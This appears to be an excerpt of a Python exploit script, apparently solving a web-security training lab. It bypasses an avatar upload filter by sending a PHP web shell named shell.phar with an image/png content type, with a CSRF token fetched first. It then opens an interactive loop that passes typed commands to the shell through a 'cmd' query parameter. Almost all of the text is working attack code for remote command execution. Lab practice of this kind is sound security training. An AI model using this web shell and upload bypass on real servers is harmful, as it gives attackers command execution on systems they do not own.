...
def probe(url, s):
    ...
    u = url + "files/avatars/shell.phar?cmd="
    c = ""
    while c != "exit":
        c = input("# ")
        up = u + c
...
def upload(url, s):
    ...
    uc = url + "my-account"
    csrf = csrft(uc, s)
    # we need to test with different extensions using intruder and a web-extensions.txt file
    # then see with wich extensions the files are uploaded
    # then test one by one of those correct attempts to execute a command and verify which one works as intended
    fileshell = {'avatar':('shell.phar',"<?php system($_GET['cmd']); ?>","image/png"),'user':'wiener','csrf':csrf}
